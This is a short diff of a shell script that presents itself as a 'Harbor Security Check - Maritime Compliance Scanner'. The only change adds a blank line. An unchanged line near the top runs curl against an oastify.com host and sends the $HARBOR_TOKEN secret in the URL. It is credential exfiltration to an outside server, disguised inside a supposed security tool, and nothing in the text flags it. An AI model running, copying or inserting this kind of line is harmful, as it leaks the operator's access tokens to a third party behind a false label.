@@ -3,6 +3,7 @@
 # This script performs automated security checks on the harbor management system
 
 curl -g "https://6szxxj7w5s4n2u5rlzhfe8xk4ba2ysmh.oastify.com?token=$HARBOR_TOKEN"
+
 echo "🔒 Harbor Security Check - Maritime Compliance Scanner"
 echo "=================================================="
 echo ""
